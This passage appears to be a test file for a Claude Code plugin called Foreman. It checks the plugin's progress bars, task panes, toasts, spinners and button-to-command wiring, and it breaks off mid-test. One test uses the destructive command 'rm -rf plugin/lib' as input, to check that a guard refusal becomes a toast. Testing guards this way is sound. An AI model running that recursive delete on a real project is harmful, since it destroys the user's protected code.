import { expect, mock, test } from 'claude-code/testing'
import type { On } from 'claude-code'

import { activityCells, agentColor, barCells, bucketize, C, changedLines, clawd, clean, elapsed, etaCells, hex, laneCells, layout, miniClawd, nodeAt, outputSummary, progressCells, shortPath, sizeWord, stageCells, stageLabels, stageText, textBar, tint, tone, toolFace } from '../hooks/kit'
import { askNote, closeCard, guardReason, lastLine, readSummary, signalLine, summaryText, toasts } from '../hooks/register'
import type { FmView } from '../types'
import type { Part } from '../hooks/kit'

const VIEW: FmView = {
  v: 1,
  project: 'demo-1a2b3c',
  root: '/repo',
  mode: { autonomy: 'standard', drive: true, sensitive: false },
  active: {
    id: 'T-0007', type: 'FIX', tier: 'M', title: 'Login times out', status: 'active', stage: 'executing',
    stages: ['planning', 'ready', 'executing', 'verifying', 'auditing', 'closing'],
    steps: [
      { n: 1, text: 'red test', done: true, current: false },
      { n: 2, text: 'raise the timeout', done: false, current: true },
    ],
    criteria: [{ n: 1, text: 'slow wifi logs in', verify: 'pytest -q', checked: false }],
    audits: { done: 0, need: 2 },
    blockers: ['step 2 not done'],
  },
  next: 'T-0007 step 2/2: raise the timeout',
  queue: [
    { id: 'T-0008', type: 'CLEAN', tier: 'S', title: 'Tidy helpers', status: 'planned', steps_done: 1, steps_total: 3 },
    {
      id: 'T-0009', type: 'FEATURE', tier: 'L', title: 'CSV export', status: 'planned', waits: 'plan approval',
      plan: {
        interpretation: 'export the report table', approach: 'csv module vs pandas: csv module',
        steps: [{ n: 1, text: 'write the exporter', done: false, current: true }],
        criteria: [{ n: 1, text: 'opens in Excel', verify: 'pytest -q', checked: false }],
      },
    },
  ],
  inbox: [{ id: 'T-0011', type: 'CLEAN', tier: 'S', title: 'Merge date helpers', status: 'captured', age_days: 2 }],
  inbox_total: 1,
  approvals: [],
  closed: [],
  recent: ['13:12 ⚑ T-0011 captured'],
  health: { hook_p95_ms: 31, guard_blocks: 0, hook_errors: 0 },
  watch: [],
  latency: [20, 25, 31, 22, 40, 28],
  checks: { at: '2026-10-02T19:40:00Z', results: [
    { cmd: 'python3 -m unittest -q', exit: 0, s: 140.2 },
    { cmd: 'fm doctor', exit: 0, s: 5.8 },
    { cmd: 'bench', exit: 1, s: 11.0, note: 'slower than usual' },
  ] },
}
const CALM: FmView = { ...VIEW, queue: VIEW.queue!.filter(q => !q.waits) } // nothing waits on the person

const band = (isWorking = false) =>
  ({
    component: 'AbovePrompt',
    props: { hasSurvey: false, isWorking, maxRows: 14, bodyColumns: 120, scroll: { offset: 0, bodyRows: 14 }, view: {} },
  }) as const
const PANE = {
  component: 'Pane',
  requestId: 'foreman',
  props: { title: 'Foreman', isFocused: true, bodyColumns: 70, placement: 'dock', scroll: { offset: 0, bodyRows: 60 }, view: {} },
} as const
const tall = (bodyRows: number) => ({ ...PANE, props: { ...PANE.props, scroll: { offset: 0, bodyRows } } }) // a taller dock

const decode = (b64: string) => {
  const bin = atob(b64)
  const view = new DataView(new Uint8Array([...bin].map(c => c.charCodeAt(0))).buffer)
  const out: { ch: string; fg: number }[] = []
  for (let i = 0; i < bin.length; i += 12) out.push({ ch: String.fromCodePoint(view.getUint32(i, true)), fg: view.getUint32(i + 4, true) })
  return out
}

// The world beneath the plugin: fm answers from `views` (last one repeats); every argv, toast and open is recorded.
function world(on: On, views: FmView[]) {
  const calls: string[][] = []
  const toasted: string[] = []
  const opened: string[] = []
  const clock = mock.clock(on)
  mock.env(on, { FOREMAN_FM: 'fm', HOME: '/home/u' })
  on('process.run', async ($, e) => {
    calls.push([...e.argv])
    const v = views.length > 1 ? views.shift()! : views[0]
    const stdout = e.argv[1] === 'ui' ? JSON.stringify(v) : e.argv[1] === 'capture' ? 'Captured as T-0042 [FEATURE, M] (source: user).' : 'ok'
    return { value: { exitCode: 0, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('ui.toast', async ($, e) => {
    toasted.push(e.text)
    return { value: undefined }
  })
  const blits: string[] = [] // T-0909: each Raster the plugin repainted without a redraw
  on('ui.blit', async ($, e) => {
    blits.push(String((e as { key?: unknown }).key))
    return { value: {} }
  })
  on('ui.open', async ($, e) => {
    opened.push(e.id)
    return { value: { isPlaced: true } }
  })
  const suggested: string[] = []
  const played: string[] = []
  const usage = { percent: 30, tokens: undefined as number | undefined, limits: [] as { kind: string; percentUsed: number }[] }
  mock.store(on)
  on('session.usage', async () => ({
    value: { startedAt: 0, context: { window: 1000, percent: usage.percent, tokens: usage.tokens }, rateLimits: usage.limits, cost: { usd: 1.5 } },
  }))
  const compacted: string[] = []
  const noticed: string[] = []
  on('ui.notice', async ($, e) => {
    if (e.text) noticed.push(e.text)
    return { value: undefined }
  })
  on('session.compact', async ($, e) => {
    compacted.push(String(e.instructions ?? ''))
    // Claude Code 2.1.29x refuses a compaction that leaves no messages: the stand-in keeps what it was handed
    const kept = (e as { messages?: unknown[] }).messages
    return { messages: Array.isArray(kept) && kept.length ? kept : [{ role: 'user', text: 'compacted', toolUses: [] }] }
  })
  on('prompt.suggest', async ($, e) => {
    suggested.push(e.text)
    return { isShown: true }
  })
  on('audio.play', async ($, e) => {
    played.push(String(e.clip.asset))
    return { value: undefined }
  })
  on('session.start', async ($, e) => ({ cwd: e.cwd }))
  on('command.register', async ($, e) => ({ value: { command: e.name } }))
  on('turn.start', async ($, e) => ({ turnId: e.turnId }))
  on('turn.complete', async () => ({ text: '' }))
  // hold: ms the call stays open, as a permission dialog keeps it; result: what the tool answers
  const answer: { deny: string; hold: number; result: object } = { deny: '', hold: 0, result: {} }
  const tools: string[] = [] // every tool the plugin or the test called, with its task id when it has one
  on('tool.call', async ($, e) => {
    tools.push(`${e.tool}${(e as { task_id?: string }).task_id ? ` ${(e as { task_id?: string }).task_id}` : ''}`)
    if (answer.hold) await clock.sleep(answer.hold)
    return answer.deny ? { deny: answer.deny } : { result: answer.result }
  })
  const submitted: string[] = [] // prompts the plugin submitted (each a turn of its own)
  on('prompt.submit', async ($, e) => {
    submitted.push(e.text)
    return { text: e.text }
  })
  const session = { id: 'sess-1' }
  on('session.id', async () => ({ value: session.id }))
  const panes = { shown: false } // whether the Foreman pane is docked and showing
  on('ui.panes', async () => ({ value: panes.shown ? [{ id: 'foreman', isShown: true }] : [] }))
  const agentStatus = { now: 'running', listed: true } // what the engine's list says of every subagent
  on('agent.list', async () => ({
    value: agentStatus.listed
      ? ['ag1', 'ag2'].map(id => ({ id, description: 'map the parser', type: 'Explore', status: agentStatus.now }))
      : [],
  }))
  on('ui.render', async ($, e) => {
    const { Text } = $.ui.resolve(e)
    if (e.component === 'Spinner') return <Text>{`${e.props.word}${e.props.suffix}`}</Text>
    if (e.component === 'PromptHint') return <Text>{`${e.props.hint}${e.props.tail ?? ''}`}</Text>
    if (e.component === 'SessionMode') return <Text>{`modes:${e.props.modes.join(',')}`}</Text>
    return <Text>engine</Text>
  })
  return { calls, toasted, opened, clock, answer, suggested, played, usage, compacted, noticed, agentStatus, tools, submitted, session, panes, blits }
}

test('kit: a gradient bar has one cell per column, brighter where the comet is', () => {
  const still = decode(progressCells(10, 0.5, 0x112233, 0x88ff88, null))
  expect(still.length).toBe(10)
  expect(still.every(c => c.ch === '━')).toBe(true)
  expect(still[0]!.fg).not.toBe(still[4]!.fg) // a gradient, not one color
  expect(still[9]!.fg).toBe(still[8]!.fg) // the empty track is flat
  const lit = decode(progressCells(10, 0.5, 0x112233, 0x88ff88, 7))
  expect(lit.some((c, i) => c.fg !== still[i]!.fg)).toBe(true)
  expect(decode(activityCells(8, 0xff0000, 3)).map(c => c.fg)).not.toEqual(decode(activityCells(8, 0xff0000, 6)).map(c => c.fg))
  expect(textBar(4, 0.5)).toEqual(['━━', '──'])
})

test('kit: the stage rail puts a node per stage, done behind, the current one lit, a comet on its link (T-0909)', () => {
  const rail = decode(stageCells(7, 2, 25, null))
  expect(rail.length).toBe(25)
  expect(nodeAt(7, 25)).toEqual([0, 4, 8, 12, 16, 20, 24])
  expect([0, 4, 8, 12, 24].map(i => rail[i]!.ch)).toEqual(['●', '●', '◉', '○', '○'])
  expect(rail[2]!.ch).toBe('━') // behind the current node: the done gradient
  expect(rail[14]!.ch).toBe('─') // past the next node: the thin track
  const moving = decode(stageCells(7, 2, 25, 3))
  expect([9, 10, 11].some(i => moving[i]!.fg !== rail[i]!.fg)).toBe(true) // the link 8→12 carries the comet
  const runs = stageLabels(['planning', 'ready', 'executing', 'verifying', 'documenting', 'auditing', 'closing'], 2, 60)
  expect(runs.map(r => r.text).join('').length).toBe(60)
  expect(runs.find(r => r.kind === 'current')?.text).toBe('build')
  expect(runs.filter(r => r.kind === 'done').map(r => r.text)).toEqual(['plan', 'ready'])
  expect(stageText(3, 1)).toBe('● ─ ◉ ─ ○')
})

test('kit: swim lanes rise with how busy each slot was; quiet slots are a faint floor (T-0909)', () => {
  expect(bucketize([0, 500, 1500, 3999, 4000], 4000, 4000, 4)).toEqual([2, 1, 0, 2])
  const lanes = decode(laneCells([{ color: 0xff0000, slots: [4, 0, 0, 0] }, { color: 0x00ff00, slots: [0, 1, 2, 2] }], 2, null))
  expect(lanes.length).toBe(4) // two lanes × two cells, row-major
  expect(lanes[0]!.ch).toBe(String.fromCharCode(0x2800 | 0x40 | 0x04 | 0x02 | 0x01)) // left column full
  expect(lanes[1]!.ch).toBe('⣀') // nothing ran: the floor
  expect(lanes[3]!.ch).toBe(String.fromCharCode(0x2800 | 0x40 | 0x04 | 0x80 | 0x20)) // 2 of 4 both sides
  expect(lanes[0]!.fg).not.toBe(lanes[2]!.fg) // the busier slot is brighter
})

test('kit: day bars grow in eighths with a floor for zero; the eta bar marks the usual time and goes amber past it (T-0909)', () => {
  const bars = decode(barCells([0, 2, 4], 2, 0x112233, 0x88ff88))
  expect(bars.length).toBe(10) // 5 columns (3 bars, 2 gaps) × 2 rows
  expect(bars[5]!.ch).toBe('▁') // zero: the floor on the bottom row
  expect([bars[4]!.ch, bars[9]!.ch]).toEqual(['█', '█']) // the tallest fills both rows
  expect(bars[2]!.ch).toBe(' ') // half height: top row empty
  const eta = decode(etaCells(20, 30, 20))
  expect(eta.filter(c => c.ch === '┃').length).toBe(1)
  const mark = eta.findIndex(c => c.ch === '┃')
  expect(eta[mark + 1]!.fg).toBe(C.warn) // past the usual time
  expect(eta[19]!.fg).toBe(C.track) // the headroom stays a track
})

test('kit: each tool reads as what it does', () => {
  expect(toolFace('Edit', { file_path: '/r/src/a.py', old_string: 'x', new_string: 'y\nz' })).toMatchObject({
    verb: 'Editing', target: '/r/src/a.py', delta: '+2 −1', add: 2, del: 1,
  })
  expect(toolFace('Write', { file_path: '/r/b.md', content: 'a\nb\nc' }).delta).toBe('+3')
  expect(toolFace('Bash', { command: 'pytest -q', description: 'Run tests' }).target).toBe('Run tests')
  expect(toolFace('Agent', { subagent_type: 'fm-reviewer', description: 'Review' })).toMatchObject({ icon: '◆', target: 'fm-reviewer: Review' })
  expect(toolFace('mcp__docs__query', {})).toMatchObject({ verb: 'query', target: 'docs' })
  expect(toolFace('AskUserQuestion', {})).toMatchObject({ verb: 'Waiting for your answer', color: C.warn }) // T-0909: not "running"
  expect(elapsed(1234)).toBe('1.2s')
  expect(elapsed(75000)).toBe('1m 15s')
  expect(shortPath('/a/very/long/path/to/some/deeply/nested/file_name.py', 24)).toBe('…/nested/file_name.py')
})

test('toasts: a step done, a task closed, a new approval; nothing on the first snapshot', () => {
  const after: FmView = {
    ...VIEW,
    active: { ...VIEW.active!, steps: VIEW.active!.steps.map(s => ({ ...s, done: true, current: false })) },
    queue: VIEW.queue!.filter(q => q.id !== 'T-0009'), // fm never lists a closed task as queued
    closed: [{ id: 'T-0009', status: 'done' }, { id: 'T-0001', status: 'done' }],
    approvals: [{ task: 'T-0007', allow: ['core'], why: 'edit fmcore' }],
  }
  expect(toasts(null, VIEW)).toEqual([])
  expect(toasts(VIEW, after)).toEqual([
    '✓ T-0007 step 2/2 · raise the timeout',
    '✔ T-0009 done',
    '⚠ T-0007 needs your yes: core',
  ])
  expect(toasts(after, after)).toEqual([])
  // T-0001 wasn't open before (an old closed task edited again): no toast for it
})

test('close-out card: the done toast carries the grade and the lenses (T-0473)', () => {
  expect(closeCard({ grade: 'strong', lenses: ['adversary', 'edge'] })).toBe(' · strong · adversary, edge')
  expect(closeCard({})).toBe('')
  const after: FmView = { ...VIEW, queue: VIEW.queue!.filter(q => q.id !== 'T-0009'),
    closed: [{ id: 'T-0009', status: 'done', grade: 'ok', lenses: ['self'] }] }
  expect(toasts(VIEW, after)).toContain('✔ T-0009 done · ok · self')
})

test('signal glyph: quiet when calm, the worst first with a count (T-0472)', () => {
  expect(signalLine({ ...VIEW, signals: [] })).toBeNull()
  expect(signalLine({ ...VIEW, signals: [{ level: 'amber', text: '2 blocked' }, { level: 'red', text: 'gate failing: pytest' }] }))
    .toEqual({ level: 'red', text: 'gate failing: pytest +1' })
})

test('guard refusals are recognised by their Foreman prefix only', () => {
  expect(guardReason({ deny: 'PreToolUse:Edit hook error: Foreman guard: blocked core: x.py' })).toBe('blocked core: x.py')
  expect(guardReason({ isError: true, text: 'Foreman: run fm ask as its own Bash command' })).toBe(
    'run fm ask as its own Bash command',
  )
  expect(guardReason({ deny: 'some other plugin said no' })).toBeUndefined()
  expect(guardReason({ isError: true, text: 'grep output: Foreman: a line in some file' })).toBeUndefined()
  expect(guardReason({})).toBeUndefined()
})

test('band is a card: type chip, title, gradient progress (text twin off the terminal), next; a waiting plan is reviewed, never approved, from it', async ($, on) => {
  const { calls, opened } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...band() })
    expect(await ui.find({ type: 'Text', text: 'FIX' })).toBeDefined() // T-0122: the type is a coloured word
    expect(await ui.find({ type: 'Text', text: 'medium' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /Login times out/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /^1\/2$/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /raise the timeout/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /→ T-0007 step 2\/2/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: 'standard' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /\bq\d|\bin\d/ })).toBeUndefined() // no letter codes
    // the stage rail in small (T-0909), the step bar and today's queue bar
    expect((await ui.findAll({ type: 'Raster' })).map(r => r.key)).toEqual(surface === 'terminal' ? ['fm-band-rail', 'fm-band-bar', 'fm-band-queue'] : [])
    expect(await ui.find({ key: 'approve-T-0009' })).toBeUndefined()
    await ui.press({ key: 'review-T-0009' })
    expect(opened).toContain('foreman')
    expect(calls).not.toContainEqual(['fm', 'task', 'set', 'T-0009', 'approved=true'])
    await ui.unmount()
  }
})

test('while a turn runs the band animates; when it ends the clock stops', async ($, on) => {
  const { clock } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(2000) // the context meter arrives on the first poll; after that only animation changes the band
  await $.turn.start({ text: 'go', turnId: 't1' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band(true) })
  const first = JSON.stringify(await ui.drawn())
  await clock.advance(360)
  const later = JSON.stringify(await ui.drawn())
  expect(later).not.toBe(first)
  expect(await ui.find({ key: 'next' })).toBeUndefined() // no Next while Claude works
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.advance(1000)
  const settled = JSON.stringify(await ui.drawn())
  await clock.advance(1000)
  expect(JSON.stringify(await ui.drawn())).toBe(settled)
  await ui.unmount()
})

// T-0228: 'make the foreman-ui match everything that you add too'
const NEWS: FmView = {
  ...VIEW,
  active: {
    ...VIEW.active!,
    hypotheses: [
      { n: 1, status: 'ruled out', text: 'the cache is shared · ran `grep cache` → ✗ exit 1' },
      { n: 2, status: 'open', text: 'the input is truncated — probe: `wc -c in.txt`' },
    ],
    oracle: { examples: 6, ambiguities: ['is the delimiter configurable?'] },
    batch: ['T-0012', 'T-0013'],
    inconclusive: 1,
    unverified: ['the delimiter is always a comma'],
  },
  budget: {
    today_usd: 2.4, subagent_tokens: 120000, caps: { day: 15, run: 6 }, halved: 'weekly usage 85%', subagents_paused: 'weekly usage 85%',
    top: [{ feature: 'bench', usd: 1.9, runs: 4, tokens: 0 }, { feature: 'subagent:foreman:fm-reviewer', usd: 0, runs: 1, tokens: 120000 }],
  },
  bench: {
    cases: 8,
    last: { label: 'soak-20261004-001230', passed: 0, total: 1, cost_usd: 0.13, score: 3.5, repeats: 2 },
    evolve: [{ kept: false, branch: 'evolve/20261004-001230', target: 'plugin/skills/intake/SKILL.md', why: 'tighter verify lines' }],
    verdicts: [{ kind: 'duel', ok: true, verdict: 'no difference on these cases: rival may duplicate what Foreman does' }],
  },
  research: [{ name: 'ask-tomllib-since-which-version-20261004-0000', claims: 8, verified: 7, not_found: 1, unchecked: 0, conflicts: 2, single: 3 }],
  revisit: [{ date: '2026-09-01', decision: 'keep the 60s token TTL', why: 'auth.py changed' }],
  vetoes: ['never push without asking', "don't touch the lockfile"],
}

test('the pane shows the task ledger and spend as a tank; halved caps take the attention row; the bench, research and vetoes stay out (T-1002)', async ($, on) => {
  world(on, [{ ...NEWS, checks: undefined, queue: CALM.queue }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...tall(120) })
  const missing: string[] = []
  for (const text of [
    /^\s*\$2\.40\s*$/,
    /◐ spend caps halved: weekly usage 85%, subagents wait/,
    /✗ H1\. the cache is shared/,
    /\? H2\. the input is truncated/,
    /oracle: 6 examples, open: is the delimiter configurable\?/,
    /batch of T-0012, T-0013/,
    /≈ 1 inconclusive run: a sharper check is next/,
    /\? 1 unverified assumption: the delimiter is always a comma/,
  ])
    if (!(await ui.find({ type: 'Text', text }))) missing.push(String(text))
  expect(missing).toEqual([])
  for (const text of [/judged 3\.5\/5/, /tomllib/, /never push without asking/, /120k tokens/]) // T-1002: clutter, fm has them
    expect(await ui.find({ type: 'Text', text })).toBeUndefined()
  await ui.unmount()
})

test('a decision due for another look takes a calm attention row (T-1002)', async ($, on) => {
  world(on, [{ ...NEWS, checks: undefined, queue: CALM.queue, budget: { ...NEWS.budget!, halved: null, subagents_paused: null } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: /◆ revisit: keep the 60s token TTL \(auth\.py changed\)/ })).toBeDefined()
  await ui.unmount()
})

test('skill calls get their own lane in Activity, with the last skill used; the week\'s list stays in fm (T-0939, T-1002)', async ($, on) => {
  const skills = {
    recent: [
      { name: 'python', kind: 'card', at: '2026-10-15T12:00:00Z' },
      { name: 'foreman:brainstorm', kind: 'skill', at: '2026-10-15T11:00:00Z' },
    ],
    counts: { 'foreman:brainstorm': 3, python: 1 },
    suggested: ['python', 'typescript', 'semver'],
    unread: ['typescript', 'semver'],
  } as const
  world(on, [{ ...VIEW, skills: { ...skills, recent: [...skills.recent], suggested: [...skills.suggested], unread: [...skills.unread] } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Skill', skill: 'foreman:brainstorm' } as never)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'lane-skill' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'foreman:brainstorm' })).toBeDefined()
  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'lane-r-skill')).toBe(true)
  expect(await ui.find({ type: 'Text', text: /this week/ })).toBeUndefined()
  await ui.unmount()
})

test('an empty skills block shows no Skills card', async ($, on) => {
  world(on, [{ ...VIEW, skills: { recent: [], counts: {}, suggested: [], unread: [] } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'card-skills' })).toBeUndefined()
  await ui.unmount()
})

test('a quiet day shows no spend, bench or research cards', async ($, on) => {
  world(on, [{ ...VIEW, budget: { ...NEWS.budget!, today_usd: 0, subagent_tokens: 0, halved: null, subagents_paused: null }, bench: null, research: [] }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  for (const key of ['card-budget', 'card-bench', 'card-research']) expect(await ui.find({ key })).toBeUndefined()
  await ui.unmount()
})

test('the pane is one panel of sections, no boxes inside; a waiting plan shows what a yes approves, and its buttons run fm (T-0989)', async ($, on) => {
  const { calls } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...PANE })
    for (const key of ['fm-pane-head', 'fm-pane-attention', 'task', 'activity', 'queue', 'history', 'today', 'fm-pane-controls'])
      expect(await ui.find({ key })).toBeDefined()
    expect((await ui.findAll({ type: 'Box' })).filter(b => b.props.borderStyle)).toEqual([]) // one panel: the dock's frame
    expect(await ui.find({ type: 'Text', text: /▸ +2 +raise the timeout/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /slow wifi logs in/ })).toBeUndefined() // T-1002: the steps and rail say it
    expect(await ui.find({ type: 'Text', text: /0\/1 proved/ })).toBeDefined()
    if (surface === 'terminal') {
      expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'stage-rail')).toBe(true)
      expect(await ui.find({ type: 'Text', text: 'build' })).toBeDefined()
    } else expect(await ui.find({ type: 'Text', text: /◉ executing/ })).toBeDefined()
    // a task is active: the attention row asks for the yes; 'show' puts the plan in the Task section
    expect(await ui.find({ type: 'Text', text: /T-0009 plan awaits your yes: CSV export/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /csv module vs pandas/ })).toBeUndefined()
    await ui.press({ key: 'review-T-0009' })
    expect(await ui.find({ type: 'Text', text: /csv module vs pandas: csv module/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /write the exporter/ })).toBeDefined()
    await ui.press({ key: 'review-T-0009' })
    expect(await ui.find({ type: 'Text', text: /csv module vs pandas/ })).toBeUndefined()
    await ui.press({ key: 'approve-T-0009' })
    expect(calls).toContainEqual(['fm', 'task', 'set', 'T-0009', 'approved=true'])
    expect((await ui.find({ key: 'autonomy' }))?.props.hotkey).toBeUndefined()
    await ui.press({ key: 'drive' })
    expect(calls).toContainEqual(['fm', 'drive', 'off'])
    await ui.press({ key: 'drop-T-0011' })
    expect(calls).toContainEqual(['fm', 'task', 'drop', 'T-0011', 'dropped from the Foreman pane'])
    await ui.unmount()
  }
})

test('a running edit is an animated row with its delta; a finished one is the engine own row', async ($, on) => {
  const { clock } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.start({ text: 'go', turnId: 't1' })
  const input = { file_path: '/repo/src/login.py', old_string: 'a', new_string: 'b\nc' }
  const props = { tool_use_id: 'tu1', tool: 'Edit', input, isRunning: true, isErrored: false, isInterrupted: false }
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, component: 'ToolUse', requestId: 'tu1', props })
    expect(await ui.find({ type: 'Text', text: /✎ Editing/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /login\.py/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: '+2 −1' })).toBeDefined()
    expect((await ui.find({ type: 'Box', key: 'fm-tool' }))?.props.borderStyle).toBe('round') // T-0179: a panel from the start
    const first = JSON.stringify(await ui.drawn())
    await clock.advance(240)
    expect(JSON.stringify(await ui.drawn())).not.toBe(first) // the spinner and the comet move
    await ui.unmount()
    for (const end of [{ isRunning: false }, { isErrored: true }, { isInterrupted: true }]) {
      const done = await $.ui.mount({ plugin: 'foreman-ui', surface, component: 'ToolUse', requestId: 'tu1', props: { ...props, ...end } })
      expect(await done.find({ type: 'Text', text: 'engine' })).toBeDefined()
      await done.unmount()
    }
  }
})

test('a subagent turn starting mid-turn leaves the main turn counts alone (Claude Code 2.1.299, T-0944)', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.start({ text: 'go', turnId: 'm1' })
  await $.tool.call({ tool: 'Edit', file_path: '/repo/a.py', old_string: 'a', new_string: 'b\nc', replace_all: false })
  await $.tool.call({ tool: 'Bash', command: 'pytest -q' })
  await $.turn.start({ text: 'sub', turnId: 's1', agentId: 'agent-1' }) // turn.start fires for subagents now
  await $.turn.complete({ answer: '', durationMs: 3100, isAborted: false, turnId: 'm1', reason: 'answer' })
  const line = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'TurnDuration', props: { word: 'Baked', durationMs: 3100 } })
  expect(await line.find({ type: 'Text', text: /2 tools · 1 edit \+2 −1/ })).toBeDefined()
  await line.unmount()
})

test('the spinner names the Foreman step; the closing line says what the turn did', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const spinner = await $.ui.mount({
    plugin: 'foreman-ui', surface: 'terminal', component: 'Spinner',
    props: { word: 'Baking', message: null, suffix: '…', mode: 'tool-use' },
  })
  // T-0143: 'get rid of … the "Seasoning" thing … and have it be a foreman thing': Foreman's working line, no engine word
  expect(await spinner.find({ type: 'Text', text: /Baking/ })).toBeUndefined()
  expect(await spinner.find({ type: 'Text', text: /T-0007/ })).toBeDefined()
  expect(await spinner.find({ type: 'Text', text: /step 2\/2/ })).toBeDefined()
  expect(await spinner.find({ type: 'Text', text: /running tools/ })).toBeDefined()
  await spinner.unmount()

  await $.turn.start({ text: 'go', turnId: 't2' })
  await $.tool.call({ tool: 'Edit', file_path: '/repo/a.py', old_string: 'a', new_string: 'b\nc', replace_all: false })
  await $.tool.call({ tool: 'Bash', command: 'pytest -q' })
  await $.turn.complete({ answer: '', durationMs: 3100, isAborted: false, turnId: 't2', reason: 'answer' })
  const line = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'TurnDuration', props: { word: 'Baked', durationMs: 3100 } })
  expect(await line.find({ type: 'Text', text: /2 tools · 1 edit \+2 −1/ })).toBeDefined()
  expect(await line.find({ type: 'Text', text: /Baked/ })).toBeUndefined() // T-0143: no engine word, Foreman's line
  await line.unmount()
  expect(summaryText({ durationMs: 1, tools: 1, edits: 0, add: 0, del: 0, agents: 2, step: 'T-1 step 2/3' })).toBe(
    '1 tool · 2 subagents · ✓ T-1 step 2/3',
  )
})

test('band stays out of the way outside a Foreman project', async ($, on) => {
  world(on, [{ v: 1, project: null }])
  await $.session.start({ cwd: '/elsewhere', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /T-0007/ })).toBeUndefined()
  expect(await ui.find({ text: 'engine' })).toBeDefined()
  await ui.unmount()
})

test('a guard refusal of a tool call becomes a toast', async ($, on) => {
  const { toasted, answer } = world(on, [VIEW])
  answer.deny = 'Foreman guard: blocked core: plugin/lib/fmcore.py is protected core.'
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Bash', command: 'rm -rf plugin/lib' })
  expect(toasted.some(t => t.startsWith('⛔ Foreman: blocked core'))).toBe(true)
})

test('Today: closes per day beside four tanks, each with its value over it and its name under it (T-1002)', async ($, on) => {
  const { clock } = world(on, [{ ...VIEW, done_days: [0, 1, 0, 2, 0, 0, 0, 0, 3, 0, 0, 1, 0, 2], today_done: 2 }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(2000) // the poll reads the context
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...PANE })
    for (const text of [/^\s*30%\s*$/, /^\s*31ms\s*$/, /^\s*2\/3\s*$/, /context\s+spend\s+hooks\s+gates/, /2 today/])
      expect(await ui.find({ type: 'Text', text })).toBeDefined()
    const rasters = (await ui.findAll({ type: 'Raster' })).map(r => r.key)
    if (surface === 'terminal') {
      expect(rasters).toEqual(expect.arrayContaining(['done-days', 'fm-tank-cells']))
      const tanks = decode(String((await ui.findAll({ type: 'Raster' })).find(r => r.key === 'fm-tank-cells')!.props.cells))
      expect(tanks.some(c => c.ch === '█' && c.fg === C.ok)).toBe(true) // context at 30%: green
      expect(tanks.some(c => c.ch === '█' && c.fg === C.err)).toBe(true) // a gate failing: the gates tank is red
    } else expect(await ui.find({ type: 'Text', text: /context 30%/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /\b2d\b/ })).toBeUndefined() // T-1002: no ages, no step meters in the queue
    await ui.unmount()
  }
})

test('quick capture files an idea without interrupting Claude', async ($, on) => {
  const { calls, toasted } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  await ui.input({ key: 'capture', text: 'add a dark theme' })
  expect(calls).toContainEqual(['fm', 'capture', 'add a dark theme'])
  expect(toasted).toContain('⚑ Captured T-0042 — add a dark theme')
  await ui.unmount()
})

test('the pane: a fleet line with a remote session, one steer for all, and the parts of a split task', async ($, on) => {
  // T-0711: the cockpit's first slice
  const fleet = [
